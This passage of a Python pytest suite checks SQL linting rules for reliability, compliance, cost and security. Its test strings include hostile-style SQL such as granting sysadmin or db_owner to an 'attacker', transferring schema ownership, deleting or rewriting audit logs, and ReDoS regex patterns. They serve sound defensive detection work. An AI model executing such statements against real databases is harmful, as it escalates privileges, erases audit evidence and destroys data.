        assert not self.rule.check(_make_query("GRANT SELECT ON users TO app_reader"))

    def test_normal_execute(self):
        assert not self.rule.check(_make_query("EXECUTE myProcedure @param1 = 'value'"))


# =============================================================================
# Reliability Rule Tests
# =============================================================================


class TestTruncateWithoutTransactionRule:
    def setup_method(self):
        self.rule = TruncateWithoutTransactionRule()

    def test_truncate_table(self):
        assert self.rule.check(_make_query("TRUNCATE TABLE users"))

    def test_truncate_no_table_keyword(self):
        assert self.rule.check(_make_query("TRUNCATE orders"))

    def test_truncate_in_migration(self):
        assert self.rule.check(_make_query("TRUNCATE TABLE staging_data"))

    def test_select_not_truncate(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))

    def test_delete_with_where(self):
        assert not self.rule.check(_make_query("DELETE FROM users WHERE id = 1"))


class TestAlterTableDestructiveRule:
    def setup_method(self):
        self.rule = AlterTableDestructiveRule()

    def test_drop_column(self):
        assert self.rule.check(_make_query("ALTER TABLE users DROP COLUMN email"))

    def test_modify_column(self):
        assert self.rule.check(_make_query("ALTER TABLE orders MODIFY COLUMN amount INT"))

    def test_rename_column(self):
        assert self.rule.check(_make_query("ALTER TABLE products RENAME COLUMN name TO title"))

    def test_change_column(self):
        assert self.rule.check(_make_query("ALTER TABLE users CHANGE COLUMN old_name new_name VARCHAR(100)"))

    def test_add_column_safe(self):
        assert not self.rule.check(_make_query("ALTER TABLE users ADD COLUMN phone VARCHAR(20)"))

    def test_add_index_safe(self):
        assert not self.rule.check(_make_query("ALTER TABLE users ADD INDEX idx_email (email)"))

    def test_create_table(self):
        assert not self.rule.check(_make_query("CREATE TABLE new_table (id INT PRIMARY KEY)"))


class TestMissingRollbackRule:
    def setup_method(self):
        self.rule = MissingRollbackRule()

    def test_begin_transaction(self):
        assert self.rule.check(_make_query("BEGIN TRANSACTION"))

    def test_start_transaction(self):
        assert self.rule.check(_make_query("START TRANSACTION"))

    def test_begin_simple(self):
        assert self.rule.check(_make_query("BEGIN"))

    def test_select_no_transaction(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))

    def test_commit_only(self):
        assert not self.rule.check(_make_query("COMMIT"))


class TestAutocommitDisabledRule:
    def setup_method(self):
        self.rule = AutocommitDisabledRule()

    def test_autocommit_zero(self):
        assert self.rule.check(_make_query("SET autocommit = 0"))

    def test_autocommit_zero_no_spaces(self):
        assert self.rule.check(_make_query("SET autocommit=0"))

    def test_implicit_transactions_on(self):
        assert self.rule.check(_make_query("SET IMPLICIT_TRANSACTIONS ON"))

    def test_autocommit_one_safe(self):
        assert not self.rule.check(_make_query("SET autocommit = 1"))

    def test_set_other_variable(self):
        assert not self.rule.check(_make_query("SET NOCOUNT ON"))

    def test_select_autocommit(self):
        assert not self.rule.check(_make_query("SELECT @@autocommit"))


class TestExceptionSwallowedRule:
    def setup_method(self):
        self.rule = ExceptionSwallowedRule()

    def test_when_others_then_null(self):
        assert self.rule.check(_make_query("EXCEPTION WHEN OTHERS THEN NULL"))

    def test_when_others_then_null_semicolon(self):
        assert self.rule.check(_make_query("WHEN OTHERS THEN NULL;"))

    def test_normal_exception_handler(self):
        assert not self.rule.check(_make_query("EXCEPTION WHEN OTHERS THEN RAISE"))

    def test_exception_when_others_no_null(self):
        assert not self.rule.check(_make_query("EXCEPTION WHEN OTHERS THEN"))

    def test_select_query(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE status = 'active'"))

    def test_when_clause_in_case(self):
        assert not self.rule.check(_make_query("SELECT CASE WHEN status = 'active' THEN 1 ELSE 0 END FROM users"))


class TestLongTransactionWithoutSavepointRule:
    def setup_method(self):
        self.rule = LongTransactionWithoutSavepointRule()

    def test_savepoint_detected(self):
        assert self.rule.check(_make_query("SAVEPOINT before_update"))

    def test_savepoint_with_name(self):
        assert self.rule.check(_make_query("SAVEPOINT sp1"))

    def test_no_savepoint(self):
        assert not self.rule.check(_make_query("BEGIN; INSERT INTO users VALUES (1); COMMIT;"))

    def test_select_no_savepoint(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


# =============================================================================
# Compliance Rule Tests
# =============================================================================


class TestUnencryptedSensitiveColumnRule:
    def setup_method(self):
        self.rule = UnencryptedSensitiveColumnRule()

    def test_password_varchar(self):
        assert self.rule.check(_make_query(
            "CREATE TABLE users (id INT, password VARCHAR(255))"
        ))

    def test_ssn_text(self):
        assert self.rule.check(_make_query(
            "CREATE TABLE profiles (id INT, ssn TEXT)"
        ))

    def test_token_char(self):
        assert self.rule.check(_make_query(
            "CREATE TABLE sessions (id INT, token CHAR(64))"
        ))

    def test_safe_column_int(self):
        assert not self.rule.check(_make_query(
            "CREATE TABLE users (id INT, age INT)"
        ))

    def test_select_not_create(self):
        assert not self.rule.check(_make_query(
            "SELECT password FROM users"
        ))


class TestRetentionPolicyMissingRule:
    def setup_method(self):
        self.rule = RetentionPolicyMissingRule()

    def test_audit_log_table(self):
        assert self.rule.check(_make_query(
            "CREATE TABLE audit_log (id INT, action TEXT)"
        ))

    def test_history_table(self):
        assert self.rule.check(_make_query(
            "CREATE TABLE history (id INT, changed_at TIMESTAMP)"
        ))

    def test_access_log_table(self):
        assert self.rule.check(_make_query(
            "CREATE TABLE access_log (id INT, ip TEXT)"
        ))

    def test_regular_table(self):
        assert not self.rule.check(_make_query(
            "CREATE TABLE users (id INT, name TEXT)"
        ))

    def test_select_from_audit(self):
        assert not self.rule.check(_make_query(
            "SELECT * FROM audit_log"
        ))


class TestCrossBorderDataTransferRule:
    def setup_method(self):
        self.rule = CrossBorderDataTransferRule()

    def test_dblink(self):
        assert self.rule.check(_make_query(
            "SELECT * FROM DBLINK('conn', 'SELECT id FROM users') AS t(id INT)"
        ))

    def test_openrowset(self):
        assert self.rule.check(_make_query(
            "SELECT * FROM OPENROWSET('SQLNCLI', 'server=remote', 'SELECT 1')"
        ))

    def test_create_server(self):
        assert self.rule.check(_make_query(
            "CREATE SERVER foreign_db FOREIGN DATA WRAPPER postgres_fdw"
        ))

    def test_create_foreign_table(self):
        assert self.rule.check(_make_query(
            "CREATE FOREIGN TABLE remote_users (id INT) SERVER foreign_db"
        ))

    def test_local_select(self):
        assert not self.rule.check(_make_query(
            "SELECT * FROM users WHERE id = 1"
        ))


class TestRightToErasureRule:
    def setup_method(self):
        self.rule = RightToErasureRule()

    def test_delete_users(self):
        assert self.rule.check(_make_query(
            "DELETE FROM users WHERE id = 42"
        ))

    def test_delete_customers(self):
        assert self.rule.check(_make_query(
            "DELETE FROM customers WHERE email = 'x@y.com'"
        ))

    def test_delete_profiles(self):
        assert self.rule.check(_make_query(
            "DELETE FROM profiles WHERE user_id = 1"
        ))

    def test_delete_orders_safe(self):
        assert not self.rule.check(_make_query(
            "DELETE FROM orders WHERE created_at < '2020-01-01'"
        ))

    def test_select_not_delete(self):
        assert not self.rule.check(_make_query(
            "SELECT * FROM users"
        ))


class TestAuditLogTamperingRule:
    def setup_method(self):
        self.rule = AuditLogTamperingRule()

    def test_delete_from_audit_log(self):
        assert self.rule.check(_make_query(
            "DELETE FROM audit_log WHERE created_at < '2023-01-01'"
        ))

    def test_update_audit_trail(self):
        assert self.rule.check(_make_query(
            "UPDATE audit_trail SET action = 'modified' WHERE id = 1"
        ))

    def test_delete_access_log(self):
        assert self.rule.check(_make_query(
            "DELETE FROM access_log WHERE id = 99"
        ))

    def test_delete_regular_table(self):
        assert not self.rule.check(_make_query(
            "DELETE FROM orders WHERE id = 1"
        ))

    def test_insert_audit_safe(self):
        assert not self.rule.check(_make_query(
            "INSERT INTO audit_log (action, user_id) VALUES ('login', 1)"
        ))


class TestConsentTableMissingRule:
    def setup_method(self):
        self.rule = ConsentTableMissingRule()

    def test_insert_marketing(self):
        assert self.rule.check(_make_query(
            "INSERT INTO marketing (user_id, email) VALUES (1, 'a@b.com')"
        ))

    def test_insert_newsletter(self):
        assert self.rule.check(_make_query(
            "INSERT INTO newsletter (email) VALUES ('a@b.com')"
        ))

    def test_insert_mailing_list(self):
        assert self.rule.check(_make_query(
            "INSERT INTO mailing_list (user_id) VALUES (42)"
        ))

    def test_insert_subscribers(self):
        assert self.rule.check(_make_query(
            "INSERT INTO subscribers (email) VALUES ('x@y.com')"
        ))

    def test_insert_regular_table(self):
        assert not self.rule.check(_make_query(
            "INSERT INTO orders (user_id, total) VALUES (1, 99.99)"
        ))

    def test_select_not_insert(self):
        assert not self.rule.check(_make_query(
            "SELECT * FROM newsletter"
        ))


# =============================================================================
# Quality Rule Tests
# =============================================================================


class TestNullComparisonRule:
    def setup_method(self):
        self.rule = NullComparisonRule()

    def test_equals_null(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE deleted_at = NULL"))

    def test_not_equals_null(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE deleted_at != NULL"))

    def test_diamond_null(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE deleted_at <> NULL"))

    def test_is_null_correct(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE deleted_at IS NULL"))

    def test_is_not_null_correct(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE deleted_at IS NOT NULL"))


class TestHardcodedDateRule:
    def setup_method(self):
        self.rule = HardcodedDateRule()

    def test_hardcoded_date_where(self):
        assert self.rule.check(_make_query("SELECT * FROM orders WHERE created_at = '2023-01-01'"))

    def test_hardcoded_date_range(self):
        assert self.rule.check(_make_query("SELECT * FROM events WHERE event_date > '2024-06-15'"))

    def test_dynamic_date(self):
        assert not self.rule.check(_make_query("SELECT * FROM orders WHERE created_at > NOW() - INTERVAL '30 days'"))

    def test_no_where(self):
        assert not self.rule.check(_make_query("SELECT * FROM orders"))

    def test_parameterized(self):
        assert not self.rule.check(_make_query("SELECT * FROM orders WHERE created_at = ?"))


class TestWildcardInColumnListRule:
    def setup_method(self):
        self.rule = WildcardInColumnListRule()

    def test_exists_select_star(self):
        assert self.rule.check(_make_query(
            "SELECT id FROM users WHERE EXISTS (SELECT * FROM orders WHERE orders.user_id = users.id)"
        ))

    def test_exists_select_one(self):
        assert not self.rule.check(_make_query(
            "SELECT id FROM users WHERE EXISTS (SELECT 1 FROM orders WHERE orders.user_id = users.id)"
        ))

    def test_regular_select_star(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


class TestDuplicateConditionRule:
    def setup_method(self):
        self.rule = DuplicateConditionRule()

    def test_duplicate_string_condition(self):
        assert self.rule.check(_make_query(
            "SELECT * FROM users WHERE status = 'active' AND status = 'active'"
        ))

    def test_duplicate_int_condition(self):
        assert self.rule.check(_make_query(
            "SELECT * FROM orders WHERE status = 1 AND status = 1"
        ))

    def test_different_conditions(self):
        assert not self.rule.check(_make_query(
            "SELECT * FROM users WHERE status = 'active' AND role = 'admin'"
        ))

    def test_same_column_different_values(self):
        assert not self.rule.check(_make_query(
            "SELECT * FROM users WHERE status = 'active' AND status = 'pending'"
        ))


class TestUnionWithoutAllRule:
    def setup_method(self):
        self.rule = UnionWithoutAllRule()

    def test_union_without_all(self):
        assert self.rule.check(_make_query(
            "SELECT id FROM users UNION SELECT id FROM admins"
        ))

    def test_union_all(self):
        assert not self.rule.check(_make_query(
            "SELECT id FROM users UNION ALL SELECT id FROM admins"
        ))

    def test_no_union(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


class TestMissingAliasRule:
    def setup_method(self):
        self.rule = MissingAliasRule()

    def test_regular_table(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))

    def test_subquery_with_alias(self):
        assert not self.rule.check(_make_query(
            "SELECT * FROM (SELECT id FROM users) AS u WHERE u.id = 1"
        ))


class TestCommentedCodeRule:
    def setup_method(self):
        self.rule = CommentedCodeRule()

    def test_commented_select(self):
        assert self.rule.check(_make_query("SELECT id FROM users -- SELECT * FROM admins"))

    def test_commented_delete(self):
        assert self.rule.check(_make_query("SELECT 1 -- DELETE FROM users"))

    def test_normal_comment(self):
        assert not self.rule.check(_make_query("SELECT id FROM users -- get active users only"))

    def test_no_comment(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE active = 1"))


# =============================================================================
# Cost Rule Tests
# =============================================================================


class TestFullTableScanRule:
    def setup_method(self):
        self.rule = FullTableScanRule()

    def test_select_star_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM orders"))

    def test_select_columns_triggers(self):
        assert self.rule.check(_make_query("SELECT id, total FROM transactions"))

    def test_where_clause_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE active = true"))

    def test_select_into_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * INTO #temp FROM source"))


class TestExpensiveWindowFunctionRule:
    def setup_method(self):
        self.rule = ExpensiveWindowFunctionRule()

    def test_row_number_triggers(self):
        assert self.rule.check(_make_query("SELECT ROW_NUMBER() OVER (ORDER BY created_at) FROM orders"))

    def test_rank_triggers(self):
        assert self.rule.check(_make_query("SELECT RANK() OVER (ORDER BY score) FROM players"))

    def test_partition_by_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY date) FROM events"))

    def test_count_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT COUNT(*) FROM users"))


class TestSelectStarInETLRule:
    def setup_method(self):
        self.rule = SelectStarInETLRule()

    def test_ctas_star_triggers(self):
        assert self.rule.check(_make_query("CREATE TABLE archive AS SELECT * FROM orders"))

    def test_insert_select_star_triggers(self):
        assert self.rule.check(_make_query("INSERT INTO summary SELECT * FROM raw_data"))

    def test_ctas_columns_no_trigger(self):
        assert not self.rule.check(_make_query("CREATE TABLE archive AS SELECT id, total FROM orders"))

    def test_select_star_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM orders"))


class TestRedundantOrderByRule:
    def setup_method(self):
        self.rule = RedundantOrderByRule()

    def test_subquery_order_by_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM (SELECT * FROM orders ORDER BY created_at) sub"))

    def test_subquery_order_by_limit_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM (SELECT * FROM orders ORDER BY created_at LIMIT 10) sub"))

    def test_outer_order_by_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM orders ORDER BY created_at"))


class TestCrossRegionDataTransferCostRule:
    def setup_method(self):
        self.rule = CrossRegionDataTransferCostRule()

    def test_openquery_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM OPENQUERY(LinkedServer, 'SELECT * FROM table')"))

    def test_dblink_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM external_table@dblink"))

    def test_external_table_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM EXTERNAL TABLE s3_data"))

    def test_local_table_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM local_table"))


class TestSecondOrderSQLInjectionRule:
    def setup_method(self):
        self.rule = SecondOrderSQLInjectionRule()

    def test_insert_dangerous_column(self):
        assert self.rule.check(_make_query("INSERT INTO users (username, email) VALUES ('test', 'a@b.com')"))
        
    def test_update_dangerous_column(self):
        assert self.rule.check(_make_query("UPDATE posts SET comment = 'user input' WHERE id = 1"))

    def test_insert_safe_column(self):
        assert not self.rule.check(_make_query("INSERT INTO logs (timestamp, level) VALUES (NOW(), 'INFO')"))
        
    def test_select_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT username FROM users"))


class TestLikeWildcardInjectionRule:
    def setup_method(self):
        self.rule = LikeWildcardInjectionRule()
        
    def test_like_parameter(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE name LIKE ?"))

    def test_double_wildcard(self):
        assert self.rule.check(_make_query("SELECT * FROM products WHERE title LIKE '%search%'"))

    def test_trailing_wildcard(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE name LIKE 'john%'"))

    def test_equals_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE name = 'john'"))


class TestWeakHashingAlgorithmRule:
    def setup_method(self):
        self.rule = WeakHashingAlgorithmRule()
        
    def test_md5_password(self):
        assert self.rule.check(_make_query("SELECT MD5(password) FROM users"))

    def test_sha1_password(self):
        assert self.rule.check(_make_query("INSERT INTO users (pwd_hash) VALUES (SHA1(password))"))

    def test_sha_secret(self):
        assert self.rule.check(_make_query("SELECT id FROM users WHERE token_hash = SHA(secret)"))

    def test_md5_safe_column(self):
        assert not self.rule.check(_make_query("SELECT MD5(filename) FROM uploads"))

    def test_sha256_password(self):
        assert not self.rule.check(_make_query("SELECT SHA256(password) FROM users"))


class TestPlaintextPasswordInQueryRule:
    def setup_method(self):
        self.rule = PlaintextPasswordInQueryRule()
        
    def test_insert_plaintext(self):
        assert self.rule.check(_make_query("INSERT INTO users (name, password) VALUES ('john', 'secret123')"))

    def test_update_plaintext(self):
        assert self.rule.check(_make_query("UPDATE accounts SET pwd = 'newpassword' WHERE id = 1"))

    def test_insert_api_key(self):
        assert self.rule.check(_make_query("INSERT INTO config (api_key) VALUES ('sk-live-abc123xyz')"))

    def test_insert_parameterized(self):
        assert not self.rule.check(_make_query("INSERT INTO users (password) VALUES (?)"))

    def test_update_hashed(self):
        assert not self.rule.check(_make_query("UPDATE users SET password = HASHBYTES('SHA2_256', @pwd)"))


class TestHardcodedEncryptionKeyRule:
    def setup_method(self):
        self.rule = HardcodedEncryptionKeyRule()
        
    def test_aes_encrypt_hardcoded(self):
        assert self.rule.check(_make_query("SELECT AES_ENCRYPT(ssn, 'MySecretKey123!')"))

    def test_aes_decrypt_hardcoded(self):
        assert self.rule.check(_make_query("SELECT AES_DECRYPT(data, 'encryption-key-do-not-share')"))

    def test_aes_encrypt_variable(self):
        assert not self.rule.check(_make_query("SELECT AES_ENCRYPT(ssn, @key_variable)"))

    def test_encryptbykey_reference(self):
        assert not self.rule.check(_make_query("SELECT ENCRYPTBYKEY(KEY_GUID('MyKeyName'), data)"))


class TestWeakEncryptionAlgorithmRule:
    def setup_method(self):
        self.rule = WeakEncryptionAlgorithmRule()
        
    def test_des_encrypt(self):
        assert self.rule.check(_make_query("SELECT DES_ENCRYPT(data, key)"))

    def test_triple_des(self):
        assert self.rule.check(_make_query("SELECT TRIPLE_DES(data, key)"))

    def test_aes_encrypt(self):
        assert not self.rule.check(_make_query("SELECT AES_ENCRYPT(data, key)"))

    def test_aes256_encrypt(self):
        assert not self.rule.check(_make_query("SELECT AES256(data, key)"))


class TestPrivilegeEscalationRoleGrantRule:
    def setup_method(self):
        self.rule = PrivilegeEscalationRoleGrantRule()
        
    def test_grant_db_owner(self):
        assert self.rule.check(_make_query("GRANT db_owner TO hacker_user"))

    def test_alter_role_admin(self):
        assert self.rule.check(_make_query("ALTER ROLE admin ADD MEMBER new_user"))

    def test_sp_addrolemember_sysadmin(self):
        assert self.rule.check(_make_query("EXEC sp_addrolemember 'sysadmin', 'attacker'"))

    def test_grant_readonly(self):
        assert not self.rule.check(_make_query("GRANT SELECT ON users TO readonly_user"))

    def test_grant_reader(self):
        assert not self.rule.check(_make_query("GRANT reader TO analyst"))


class TestSchemaOwnershipChangeRule:
    def setup_method(self):
        self.rule = SchemaOwnershipChangeRule()
        
    def test_alter_authorization(self):
        assert self.rule.check(_make_query("ALTER AUTHORIZATION ON SCHEMA::dbo TO attacker"))

    def test_alter_schema_transfer(self):
        assert self.rule.check(_make_query("ALTER SCHEMA sales TRANSFER dbo.customers"))

    def test_alter_table(self):
        assert not self.rule.check(_make_query("ALTER TABLE users ADD COLUMN email VARCHAR(255)"))

    def test_grant_select_schema(self):
        assert not self.rule.check(_make_query("GRANT SELECT ON schema::sales TO user"))


class TestHorizontalAuthorizationBypassRule:
    def setup_method(self):
        self.rule = HorizontalAuthorizationBypassRule()
        
    def test_orders_no_scoping(self):
        assert self.rule.check(_make_query("SELECT * FROM orders WHERE status = 'pending'"))

    def test_transactions_no_scoping(self):
        assert self.rule.check(_make_query("SELECT * FROM transactions"))

    def test_orders_with_scoping(self):
        assert not self.rule.check(_make_query("SELECT * FROM orders WHERE user_id = ? AND status = 'pending'"))

    def test_safe_table(self):
        assert not self.rule.check(_make_query("SELECT * FROM products WHERE active = true"))


class TestSensitiveDataInErrorOutputRule:
    def setup_method(self):
        self.rule = SensitiveDataInErrorOutputRule()
        
    def test_raiserror_password(self):
        assert self.rule.check(_make_query("RAISERROR('Invalid password: %s', 16, 1, @password)"))

    def test_print_ssn(self):
        assert self.rule.check(_make_query("PRINT 'User SSN: ' + @ssn"))

    def test_raise_notice_token(self):
        assert self.rule.check(_make_query("RAISE NOTICE 'Token value: %', api_key"))

    def test_raiserror_safe(self):
        assert not self.rule.check(_make_query("RAISERROR('User not found', 16, 1)"))

    def test_print_safe(self):
        assert not self.rule.check(_make_query("PRINT 'Operation completed'"))


class TestAuditTrailManipulationRule:
    def setup_method(self):
        self.rule = AuditTrailManipulationRule()
        
    def test_delete_audit_log(self):
        assert self.rule.check(_make_query("DELETE FROM audit_log WHERE created_at < '2020-01-01'"))

    def test_truncate_security_log(self):
        assert self.rule.check(_make_query("TRUNCATE TABLE security_log"))

    def test_disable_audit_trail(self):
        assert self.rule.check(_make_query("SET audit_trail = NONE"))

    def test_update_audit(self):
        assert self.rule.check(_make_query("UPDATE audit SET action = 'read' WHERE action = 'delete'"))

    def test_insert_audit(self):
        assert not self.rule.check(_make_query("INSERT INTO audit_log (action) VALUES ('login')"))

    def test_select_audit(self):
        assert not self.rule.check(_make_query("SELECT * FROM audit_log"))


class TestInsecureSessionTokenStorageRule:
    def setup_method(self):
        self.rule = InsecureSessionTokenStorageRule()
        
    def test_insert_session_token(self):
        assert self.rule.check(_make_query("INSERT INTO sessions (user_id, session_token) VALUES (1, 'abc123xyz789_abcdefghij...')"))

    def test_update_auth_token(self):
        assert self.rule.check(_make_query("UPDATE sessions SET auth_token = 'eyJhbGciOiJIUzI1NiIs...'"))

    def test_insert_token_hash(self):
        assert not self.rule.check(_make_query("INSERT INTO sessions (token_hash) VALUES (SHA256(?))"))

    def test_select_token(self):
        assert not self.rule.check(_make_query("SELECT session_token FROM sessions WHERE user_id = ?"))


class TestSessionTimeoutNotEnforcedRule:
    def setup_method(self):
        self.rule = SessionTimeoutNotEnforcedRule()
        
    def test_select_token_no_expiry(self):
        assert self.rule.check(_make_query("SELECT user_id FROM sessions WHERE token = ?"))

    def test_select_auth_token_no_expiry(self):
        assert self.rule.check(_make_query("SELECT * FROM auth_tokens WHERE session_id = ?"))

    def test_select_token_with_expires_at(self):
        assert not self.rule.check(_make_query("SELECT user_id FROM sessions WHERE token = ? AND expires_at > NOW()"))

    def test_select_token_with_valid_until(self):
        assert not self.rule.check(_make_query("SELECT * FROM sessions WHERE token = ? AND valid_until > CURRENT_TIMESTAMP"))


class TestUnboundedRecursiveCTERule:
    def setup_method(self):
        self.rule = UnboundedRecursiveCTERule()
        
    def test_recursive_cte_unbounded(self):
        assert self.rule.check(_make_query("WITH RECURSIVE cte AS (SELECT 1 UNION ALL SELECT n+1 FROM cte) SELECT * FROM cte"))

    def test_recursive_cte_with_maxrecursion(self):
        assert not self.rule.check(_make_query("WITH RECURSIVE cte AS (SELECT 1 UNION ALL SELECT n+1 FROM cte) SELECT * FROM cte OPTION (MAXRECURSION 100)"))

    def test_non_recursive_cte(self):
        assert not self.rule.check(_make_query("WITH cte AS (SELECT 1 UNION ALL SELECT 2) SELECT * FROM cte"))


class TestRegexDenialOfServiceRule:
    def setup_method(self):
        self.rule = RegexDenialOfServiceRule()
        
    def test_regexp_a_plus(self):
        assert self.rule.check(_make_query("SELECT * FROM data WHERE text REGEXP '(a+)+'"))

    def test_rlike_dot_star(self):
        assert self.rule.check(_make_query("SELECT * FROM logs WHERE msg RLIKE '(.*)*'"))

    def test_safe_regex(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE email REGEXP '^[a-z]+@[a-z]+\\.[a-z]+$'"))

    def test_like_query(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE name LIKE '%john%'"))


class TestImplicitTypeConversionRule:
    def setup_method(self):
        self.rule = ImplicitTypeConversionRule()

    def test_implicit_conversion_string_to_int(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE user_id = '123'"))

    def test_no_implicit_conversion(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE user_id = 123"))


class TestCompositeIndexOrderViolationRule:
    def setup_method(self):
        self.rule = CompositeIndexOrderViolationRule()

    def test_composite_index_order_violation(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE user_id = 123"))

    def test_no_violation(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE tenant_id = 1 AND user_id = 123"))


class TestNonSargableOrConditionRule:
    def setup_method(self):
        self.rule = NonSargableOrConditionRule()

    def test_non_sargable_or(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE first_name = 'John' OR last_name = 'Smith'"))

    def test_sargable_and(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE first_name = 'John' AND last_name = 'Smith'"))


class TestCoalesceOnIndexedColumnRule:
    def setup_method(self):
        self.rule = CoalesceOnIndexedColumnRule()

    def test_coalesce_on_column(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE COALESCE(status, 'active') = 'active'"))

    def test_no_coalesce(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE status = 'active'"))


class TestNegationOnIndexedColumnRule:
    def setup_method(self):
        self.rule = NegationOnIndexedColumnRule()

    def test_negation_not_equal(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE status != 'active'"))

    def test_negation_not_in(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE status NOT IN ('active', 'pending')"))

    def test_no_negation(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE status = 'active'"))


class TestTableLockHintRule:
    def setup_method(self):
        self.rule = TableLockHintRule()

    def test_table_lock_hint(self):
        assert self.rule.check(_make_query("SELECT * FROM users WITH (TABLOCK)"))

    def test_no_table_lock(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


class TestReadUncommittedHintRule:
    def setup_method(self):
        self.rule = ReadUncommittedHintRule()

    def test_nolock(self):
        assert self.rule.check(_make_query("SELECT * FROM orders WITH (NOLOCK)"))

    def test_readuncommitted(self):
        assert self.rule.check(_make_query("SELECT * FROM orders WITH (READUNCOMMITTED)"))

    def test_no_nolock(self):
        assert not self.rule.check(_make_query("SELECT * FROM orders"))


class TestLongTransactionPatternRule:
    def setup_method(self):
        self.rule = LongTransactionPatternRule()

    def test_multiple_statements_in_transaction(self):
        long_query = "BEGIN TRANSACTION; " + "UPDATE users SET status = 'active'; " * 20 + "COMMIT;"
        assert self.rule.check(_make_query(long_query))

    def test_short_transaction(self):
        assert not self.rule.check(_make_query("BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;"))


class TestMissingTransactionIsolationRule:
    def setup_method(self):
        self.rule = MissingTransactionIsolationRule()

    def test_missing_isolation(self):
        assert self.rule.check(_make_query("BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;"))

    def test_with_isolation(self):
        assert not self.rule.check(_make_query("SET TRANSACTION ISOLATION LEVEL READ COMMITTED; BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;"))


class TestCursorDeclarationRule:
    def setup_method(self):
        self.rule = CursorDeclarationRule()

    def test_cursor_declaration(self):
        assert self.rule.check(_make_query("DECLARE cursor_users CURSOR FOR SELECT * FROM users"))

    def test_no_cursor(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


class TestWhileLoopPatternRule:
    def setup_method(self):
        self.rule = WhileLoopPatternRule()

    def test_while_loop(self):
        assert self.rule.check(_make_query("WHILE @i < 10 BEGIN SELECT 1; SET @i = @i + 1; END"))

    def test_no_while_loop(self):
        assert not self.rule.check(_make_query("SELECT 1"))


class TestNestedLoopJoinHintRule:
    def setup_method(self):
        self.rule = NestedLoopJoinHintRule()

    def test_nested_loop_join(self):
        assert self.rule.check(_make_query("SELECT * FROM a INNER LOOP JOIN b ON a.id = b.id"))

    def test_regular_join(self):
        assert not self.rule.check(_make_query("SELECT * FROM a INNER JOIN b ON a.id = b.id"))


class TestLargeInClauseRule:
    def setup_method(self):
        self.rule = LargeInClauseRule()

    def test_large_in_clause(self):
        in_list = ",".join(str(i) for i in range(1005))
        assert self.rule.check(_make_query(f"SELECT * FROM users WHERE id IN ({in_list})"))

    def test_small_in_clause(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE id IN (1, 2, 3)"))


class TestUnboundedTempTableRule:
    def setup_method(self):
        self.rule = UnboundedTempTableRule()

    def test_unbounded_temp_table(self):
        assert self.rule.check(_make_query("SELECT * INTO #temp_users FROM users"))

    def test_bounded_temp_table(self):
        assert not self.rule.check(_make_query("SELECT * INTO #temp_users FROM users WHERE id > 100"))

    def test_top_into_temp_table(self):
        assert not self.rule.check(_make_query("SELECT TOP 10 * INTO #temp_users FROM users"))

    def test_limit_into_temp_table(self):
        assert not self.rule.check(_make_query("SELECT * INTO #temp_users FROM users LIMIT 10"))


class TestOrderByWithoutLimitInSubqueryRule:
    def setup_method(self):
        self.rule = OrderByWithoutLimitInSubqueryRule()

    def test_order_by_in_subquery(self):
        assert self.rule.check(_make_query("SELECT * FROM (SELECT * FROM users ORDER BY created_at) AS u"))

    def test_order_by_with_limit(self):
        assert not self.rule.check(_make_query("SELECT * FROM (SELECT * FROM users ORDER BY created_at LIMIT 10) AS u"))


class TestGroupByHighCardinalityRule:
    def setup_method(self):
        self.rule = GroupByHighCardinalityRule()

    def test_high_cardinality_group_by(self):
        assert self.rule.check(_make_query("SELECT user_id, count(*) FROM logs GROUP BY user_id, email, phone, address"))

    def test_low_cardinality(self):
        assert not self.rule.check(_make_query("SELECT status, count(*) FROM users GROUP BY status"))


class TestQueryOptimizerHintRule:
    def setup_method(self):
        self.rule = QueryOptimizerHintRule()

